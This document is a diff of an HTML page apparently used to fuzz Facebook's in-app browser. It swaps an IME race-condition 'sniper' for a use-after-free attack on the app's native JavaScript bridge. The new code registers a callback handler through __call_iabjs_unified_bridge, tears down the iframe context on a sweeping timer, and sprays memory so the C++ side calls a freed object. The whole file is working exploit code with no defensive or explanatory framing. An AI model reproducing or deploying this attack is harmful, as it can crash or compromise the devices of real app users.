@@ -1,61 +1,63 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>IME Sniper Fuzzer</title>
-</head>
-<body style="background:#000; color:#0f0; font-family:monospace;">
-    <h3>Executing Single-Shot IME Race Condition...</h3>
-    
+<head><title>V8 Callback UAF Fuzzer</title></head>
+<body style="background:#000; color:#f00; font-family:monospace;">
+    <h3>Attacking V8 Bridge Contexts...</h3>
     <div id="container"></div>
 
     <script>
         const container = document.getElementById('container');
         
-        // The Goldilocks string: ~300KB to bypass the 1MB Binder limit
-        const giantText = "A".repeat(150000) + " PWNED " + "B".repeat(150000);
+        // We sweep the teardown timing from 1ms to 50ms to catch the exact 
+        // microsecond the C++ thread tries to invoke the callback
+        let raceTiming = 1; 
         
-        // We test different teardown timings to catch the exact moment the C++ pointer is used
-        let teardownDelay = 5; 
-
-        function fireSniper() {
-            // 1. Isolate in an IFrame
+        function fireCallbackUAF() {
+            // 1. Create an isolated V8 Context (IFrame)
             let iframe = document.createElement('iframe');
-            iframe.style.width = '100%';
-            iframe.style.height = '300px';
             container.appendChild(iframe);
+            let iwin = iframe.contentWindow;
             
-            let idoc = iframe.contentDocument;
+            // 2. Create the target object inside the isolated context
+            // Facebook's C++ bridge will attempt to store a pointer to this
+            iwin._AutofillCallbackHandler = {
+                invoke: function(id, data) { console.log("Callback triggered"); }
+            };
             
-            // 2. Inject the payload
-            let box = idoc.createElement('textarea');
-            box.style.width = '100%';
-            box.style.height = '100%';
-            box.value = giantText;
-            idoc.body.appendChild(box);
-
-            // 3. Wake up the keyboard and native IME bridge
-            box.focus();
-
-            // 4. Trigger ONE massive surrounding text extraction
-            let pos = Math.floor(Math.random() * 290000);
-            box.setSelectionRange(pos, pos + 50);
-
-            // 5. The Sniper Teardown
-            // Destroy the C++ RenderFrameHost *exactly* as the text extraction is routed
+            let uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
+            let initPayload = JSON.stringify({
+                "message": {
+                    "name": "_AutofillCallbackHandler",
+                    "callbackID": "f876739fb"
+                }
+            });
+            
+            // 3. Register the callback with Facebook's native bridge
+            if (window.__call_iabjs_unified_bridge) {
+                try {
+                    window.__call_iabjs_unified_bridge("initializeCallbackHandler", uuid, initPayload);
+                    // Trigger a secondary action to force async processing
+                    window.__call_iabjs_unified_bridge("BrowserDeclutterJS", uuid, '{"event":"init"}');
+                } catch(e) {}
+            }
+            
+            // 4. The UAF Race: Destroy the V8 Context right as C++ tries to call the handler
             setTimeout(() => {
-                container.innerHTML = ''; 
+                iframe.remove();
                 
-                // Increment delay slightly for the next shot to sweep the race window
-                teardownDelay += 5;
-                if (teardownDelay > 100) teardownDelay = 5;
+                // Force memory churn to overwrite the freed V8 object
+                // This ensures the C++ pointer becomes a true dangling pointer
+                let trash = new Array(5000).fill("A".repeat(1000));
                 
-            }, teardownDelay);
+                // Increment our sniper scope
+                raceTiming++;
+                if(raceTiming > 50) raceTiming = 1;
+                
+            }, raceTiming);
         }
 
-        // Fire one precise shot every 1.5 seconds. No spamming.
-        setInterval(fireSniper, 1500);
-
+        // Fire 10 times a second to flood the bridge with dangling callbacks
+        setInterval(fireCallbackUAF, 100);
     </script>
 </body>
 </html>
